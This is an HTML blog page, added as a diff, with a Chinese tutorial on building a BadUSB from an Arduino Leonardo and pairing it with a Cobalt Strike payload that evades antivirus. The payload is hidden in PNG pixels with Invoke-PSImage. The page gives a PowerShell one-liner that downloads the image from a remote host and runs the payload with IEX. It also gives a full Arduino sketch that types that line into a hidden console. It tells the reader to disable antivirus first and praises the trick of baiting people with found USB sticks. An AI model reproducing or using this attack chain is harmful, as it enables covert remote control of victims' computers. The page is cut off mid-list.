@@ -1,0 +1,288 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Badusb制作及CS免杀上线 | Riddler's Blog</title><meta name="keywords" content="Badusb,CS免杀"><meta name="author" content="Riddler"><meta name="copyright" content="Riddler"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="制作Badusb并使用免杀图片隐写马上线Cobalt Strike">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Badusb制作及CS免杀上线">
+<meta property="og:url" content="http://riddlerm.github.io/posts/59900/index.html">
+<meta property="og:site_name" content="Riddler&#39;s Blog">
+<meta property="og:description" content="制作Badusb并使用免杀图片隐写马上线Cobalt Strike">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224174207196.png">
+<meta property="article:published_time" content="2022-02-24T12:32:10.000Z">
+<meta property="article:modified_time" content="2022-02-24T13:02:35.925Z">
+<meta property="article:author" content="Riddler">
+<meta property="article:tag" content="Badusb">
+<meta property="article:tag" content="CS免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224174207196.png"><link rel="shortcut icon" href="/"><link rel="canonical" href="http://riddlerm.github.io/posts/59900/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?f81b5d84e4bdc4af11ff40d4ae8aee38";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"CGPIG604DI","apiKey":"e50317aef2bf77a1f663422684b2a897","indexName":"blogsearch","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Badusb制作及CS免杀上线',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-24 21:02:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://thirdqq.qlogo.cn/g?b=oidb&amp;k=LMGBgwOams2fZdeTFTEk8g&amp;s=100" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224174207196.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Riddler's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Badusb制作及CS免杀上线</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-24T12:32:10.000Z" title="发表于 2022-02-24 20:32:10">2022-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-24T13:02:35.925Z" title="更新于 2022-02-24 21:02:35">2022-02-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%98%E8%85%BE/">折腾</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Badusb制作及CS免杀上线"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Badusb介绍"><a href="#Badusb介绍" class="headerlink" title="Badusb介绍"></a>Badusb介绍</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在2014年美国黑帽大会上，安全研究人员JakobLell和独立安全研究人员<code>Karsten Nohl</code>展示了他们称为<code>BadUSB</code>的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
+<h2 id="原理（HID攻击）"><a href="#原理（HID攻击）" class="headerlink" title="原理（HID攻击）"></a>原理（HID攻击）</h2><p>HID是<code>Human Interface Device</code>的缩写，由其名称可以了解HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。</p>
+<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ul>
+<li>BadUSB是利用了USB协议上的漏洞，通过更改USB的内部固件，在正常的USB接口接入后，模拟外置鼠标、键盘的功能，以此来使目标主机执行已经精心构造好的命令。而且因为是在固件级别的应用，U盘格式化根本无法阻止其内部代码的执行。</li>
+<li>同样因为是对USB的利用，Windows、Linux、MAC等各类操作系统不必联网下载专用的驱动程序。此外，向BadUSB烧录的程序极为简单，大部分是对键盘按键进行模拟，上手较为容易。</li>
+<li>BadUSB也是社会工程学的一个典型示例，它极大地利用了人们的好奇心，在路边捡到的USB，估计九成以上的人们都想看看里面有什么东西，而当你插入U盘，攻击就很难再停止下来了。</li>
+</ul>
+<h2 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h2><p>能够制作BadUSB的几种常见载体有：<code>leonardo_Arduino</code>、<code>Phison</code>、<code>Teensy</code>、<code>Attiny85</code>、<code>PS2303（芯片）</code>、<code>Rubber_Ducky</code>等，从外观形状和制作成功率来看，使用<code>leonardo_Arduino</code>制作BadUSB的效果最好，使用起来也较为方便。</p>
+<img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224174207196.png" alt="image-20220224174207196" style="zoom:50%;" />
+
+<center>leonardo_Arduino</center>
+
+<h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p>Badusb插入后，会模拟键盘鼠标对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载其他代码并于后台静默运行。这些代码功能包括：<code>窃取信息</code>、<code>反弹shell</code>、<code>发送邮件</code>等，从而实现控制目标机或者窃取信息的目的。</p>
+<p>推荐一个仓库：<a target="_blank" rel="noopener" href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads</a></p>
+<p>这里有很多各种姿势的payload。(展示其中一部分)</p>
+<img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224201950914.png" alt="image-20220224201950914" style="zoom:50%;" />
+
+<h1 id="制作免杀图片马"><a href="#制作免杀图片马" class="headerlink" title="制作免杀图片马"></a>制作免杀图片马</h1><p>免杀的姿势有很多，看到这个挺有意思的，这次演示就用这种方式吧。</p>
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>用到的工具 <a target="_blank" rel="noopener" href="https://github.com/peewpw/Invoke-PSImage">Invoke-PSImage</a></p>
+<blockquote>
+<p>以 PNG 文件的像素对 PowerShell 脚本进行编码并生成要执行的 oneliner</p>
+<p>Invoke-PSImage 采用 PowerShell 脚本并将脚本的字节编码为 PNG 图像的像素。它生成一个单行器，用于从网络文件或文件执行。</p>
+<p>它可以仅使用有效负载数据创建新图像，也可以将有效负载嵌入现有图像的最低有效字节中，使其看起来像实际图片。图像保存为 PNG，并且可以无损压缩而不会影响执行有效负载的能力，因为数据存储在颜色本身中。在创建新图像时，普通的 PowerShell 脚本实际上会被显着压缩，通常会生成一个文件大小约为原始脚本 50% 的 png。</p>
+<p>使用嵌入方法，每个像素中 2 个颜色值的最低有效 4 位用于保存有效载荷。结果图像质量会受到影响，但看起来仍然不错。它可以接受大多数图像类型作为输入，但输出将始终是 PNG，因为它需要是无损的。图像的每个像素都用于保存一个字节的脚本，因此您需要一个像素至少与脚本中字节数一样多的图像。这相当容易——例如，Invoke-Mimikatz 适合 1920x1200 图像。</p>
+</blockquote>
+<h2 id="制作免杀马"><a href="#制作免杀马" class="headerlink" title="制作免杀马"></a>制作免杀马</h2><h3 id="使用CS生成payload"><a href="#使用CS生成payload" class="headerlink" title="使用CS生成payload"></a>使用CS生成payload</h3><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224193306172.png" alt="image-20220224193306172" style="zoom:50%;" />
+
+<img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224193340922.png" alt="image-20220224193340922" style="zoom:50%;" />
+
+<p>把生成的<code>payload.ps1</code>放到免杀工具文件夹。</p>
+<h3 id="生成免杀图片马"><a href="#生成免杀图片马" class="headerlink" title="生成免杀图片马"></a>生成免杀图片马</h3><p>找一张图片，分别率最好在<code>1920*1080</code>及以上，方便能存下我们的payload。</p>
+<p>在免杀工具所在文件夹，按住<code>shift</code> + <code>鼠标右键</code> 选择 <code>在此处打开powershell窗口</code>。</p>
+<p>将准备好的图片也放到此文件夹，然后开始按照以下命令制作。</p>
+<blockquote>
+<p>官方示例：</p>
+<p>使用嵌入的脚本“Invoke-Mimikatz.ps1”创建一个图像并输出一个payload以从 Web 执行：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt;<span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-PSImage</span>.ps1</span><br><span class="line"><span class="built_in">PS</span>&gt;<span class="built_in">Invoke-PSImage</span> <span class="literal">-Script</span> .\<span class="built_in">Invoke-Mimikatz</span>.ps1 <span class="literal">-Out</span> .\evil<span class="literal">-kiwi</span>.png <span class="literal">-Image</span> .\kiwi.jpg <span class="literal">-WebClient</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>… 提醒一句，制作之前先把杀毒软件关掉，要不然就会这样…</p>
+<img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224192841067.png" alt="image-20220224192841067" style="zoom:50%;" />
+
+<p>根据自己的文件名修改后的命令为：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-PSImage</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-PSImage</span> <span class="literal">-Script</span> .\payload.ps1 <span class="literal">-Out</span> .\out.png <span class="literal">-Image</span> .\pic.png <span class="literal">-WebClient</span></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>payload.ps1</code>是刚才用CS生成的payload，<code>out.png</code>是生成的图片马，<code>pic.png</code>是实现准备好的图片。</p>
+<p>执行命令后，会得到一段payload。</p>
+<p><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224194148932.png" alt="image-20220224194148932"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&#x27;http://example.com/out.png&#x27;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">3840</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">1919</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">1920</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3534</span>]))</span><br></pre></td></tr></table></figure>
+
+<p>这段payload在powershell运行，就会执行隐写到图片里的CS马的payload。</p>
+<p>其中的<code>http://example.com/out.png</code>是需要我们换成自己的图片的链接。</p>
+<p>比如把图片放到图床，或者自己服务器之类的，我这里是放到自己服务器了。</p>
+<p><code>注意不要使用https访问，不然可能会导致powershell执行失败。</code></p>
+<h3 id="杀毒测试"><a href="#杀毒测试" class="headerlink" title="杀毒测试"></a>杀毒测试</h3><p><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224194345480.png" alt="image-20220224194345480"></p>
+<h1 id="制作Badusb"><a href="#制作Badusb" class="headerlink" title="制作Badusb"></a>制作Badusb</h1><h2 id="购买Badusb"><a href="#购买Badusb" class="headerlink" title="购买Badusb"></a>购买Badusb</h2><p>TB就有，注意有的上面带的有logo，尽量选择不带logo的吧，我买的时候价格是60-70。</p>
+<h2 id="下载Arduino-IDE"><a href="#下载Arduino-IDE" class="headerlink" title="下载Arduino IDE"></a>下载Arduino IDE</h2><blockquote>
+<p>Arduino介绍：Arduino是一款便捷灵活、方便上手的开源电子原型平台。 它构建于开放原始码simple I/O介面版，并且具有使用类似Java、C语言的Processing/Wiring开发环境。主要包含两个主要的部分：硬件部分是可以用来做电路连接的Arduino电路板；另外一个则是Arduino IDE，你的计算机中的程序开发环境。你只要在IDE中编写程序代码，将程序上传到Arduino电路板后，程序便会告诉Arduino电路板要做些什么了。</p>
+</blockquote>
+<img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224184539970.png" alt="image-20220224184539970" style="zoom:50%;" />
+
+<p>下载链接：<a target="_blank" rel="noopener" href="https://www.arduino.cc/en/software">https://www.arduino.cc/en/software</a></p>
+<h2 id="将Badusb连接到IDE"><a href="#将Badusb连接到IDE" class="headerlink" title="将Badusb连接到IDE"></a>将Badusb连接到IDE</h2><ol>
+<li><p>插入Badusb</p>
+</li>
+<li><p>打开Arduino IDE</p>
+</li>
+<li><p>选择 工具-&gt;开发板-&gt;Arduino Leonardo</p>
+</li>
+<li><p>选择 工具-&gt;端口-&gt;COM*(Arduino Leonardo)</p>
+<p>此时右下角就已经选中到了你选择的 <code>COM*</code></p>
+</li>
+</ol>
+<img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224185024160.png" alt="image-20220224185024160" style="zoom:50%;" />
+
+<img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224185338780.png" alt="image-20220224185338780" style="zoom:50%;" />
+
+
+
+<h2 id="烧录代码进Badusb"><a href="#烧录代码进Badusb" class="headerlink" title="烧录代码进Badusb"></a>烧录代码进Badusb</h2><p>复制以下代码 (可以根据自己的需求修改，常用arduino函数和按键代码附在文章末尾)</p>
+<blockquote>
+<p>其中 <code> Keyboard.println(*******)</code>里面的内容换成自己的payload，并且建议将整段payload进行大小写互换，以防止在Badusb运行期间因为大小写而导致运行失败。</p>
+<p>大小写互换可以用 Notepad++ 来实现。</p>
+<img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224195203422.png" alt="image-20220224195203422" style="zoom:50%;" />
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;<span class="comment">//初始化</span></span><br><span class="line">  Keyboard.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时</span></span><br><span class="line">  Keyboard.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line">  Keyboard.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></span><br><span class="line">  Keyboard.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">println</span>(<span class="string">&quot;CMD /q /d /f:off /v:on /k MODE con: cols=15 lines=1&quot;</span>); <span class="comment">//无回显  </span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  Keyboard.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">println</span>(<span class="string">&quot;Powershell&quot;</span>);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  Keyboard.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">println</span>(<span class="string">&quot;SAL A nEW-oBJECT;aDD-tYPE -a sYSTEM.dRAWING;$G=A sYSTEM.dRAWING.bITMAP((A nET.wEBcLIENT).oPENrEAD(&#x27;http://example.com/out.png&#x27;));$O=A bYTE[] 3840;(0..1)|%&#123;FOREACH($X IN(0..1919))&#123;$P=$G.gETpIXEL($X,$_);$O[$_*1920+$X]=([MATH]::fLOOR(($P.b-BAND15)*16)-BOR($P.g -BAND 15))&#125;&#125;;iex([sYSTEM.tEXT.eNCODING]::ascii.gETsTRING($O[0..3534]))&quot;</span>);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">10000</span>);</span><br><span class="line">  Keyboard.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">  Keyboard.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">  Keyboard.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line">  Keyboard.<span class="built_in">println</span>(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(KEY_LEFT_GUI);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(<span class="string">&#x27;m&#x27;</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line">  Keyboard.<span class="built_in">release</span>(<span class="string">&#x27;m&#x27;</span>);</span><br><span class="line">  Keyboard.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将代码复制到IDE，然后点击<code>√</code>来检查是否有语法错误。</p>
+<p><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224195430137.png" alt="image-20220224195430137"></p>
+<p>编译完成后，点击<code>√</code>  旁边的  <code>-&gt;</code> 来把代码烧录进Badusb。</p>
+<p><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224200228769.png" alt="image-20220224200228769"></p>
+<p>烧录结束后，会自动执行一下Badusb里的代码。</p>
+<h2 id="常用arduino代码和按键"><a href="#常用arduino代码和按键" class="headerlink" title="常用arduino代码和按键"></a>常用arduino代码和按键</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时毫秒</span></span><br><span class="line">Keyboard.<span class="built_in">begin</span>(); <span class="comment">//开始键盘通讯</span></span><br><span class="line">Keyboard.<span class="built_in">end</span>(); <span class="comment">//结束键盘通讯</span></span><br><span class="line">Keyboard.<span class="built_in">press</span>(); <span class="comment">//按下键盘按键 如果是非特殊按键如 数字、字母按键用单引号括起来</span></span><br><span class="line">Keyboard.<span class="built_in">release</span>(); <span class="comment">//释放键盘按键</span></span><br><span class="line">Keyboard.<span class="built_in">println</span>(“”); <span class="comment">//输入字符串使用双引号括起来</span></span><br><span class="line">Mouse.<span class="built_in">begin</span>();<span class="comment">//鼠标事件开始</span></span><br><span class="line">Mouse.<span class="built_in">click</span>();<span class="comment">//鼠标单击</span></span><br><span class="line">Mouse.<span class="built_in">end</span>();<span class="comment">//鼠标事件结束</span></span><br><span class="line">Mouse.<span class="built_in">move</span>();<span class="comment">//鼠标移动(x,y)</span></span><br><span class="line">Mouse.<span class="built_in">press</span>();<span class="comment">//鼠标按下</span></span><br><span class="line">Mouse.<span class="built_in">release</span>();<span class="comment">//鼠标松开</span></span><br><span class="line">KEY_LEFT_CTRL</span><br><span class="line">KEY_LEFT_SHIFT</span><br><span class="line">KEY_LEFT_ALT</span><br><span class="line">KEY_LEFT_GUI <span class="comment">//win键</span></span><br><span class="line">KEY_RIGHT_CTRL</span><br><span class="line">KEY_RIGHT_SHIFT</span><br><span class="line">KEY_RIGHT_ALT</span><br><span class="line">KEY_RIGHT_GUI</span><br><span class="line">KEY_UP_ARROW</span><br><span class="line">KEY_DOWN_ARROW</span><br><span class="line">KEY_LEFT_ARROW</span><br><span class="line">KEY_RIGHT_ARROW</span><br><span class="line">KEY_BACKSPACE</span><br><span class="line">KEY_TAB</span><br><span class="line">KEY_RETURN<span class="comment">//回车键</span></span><br><span class="line">KEY_ESC</span><br><span class="line">KEY_INSERT</span><br><span 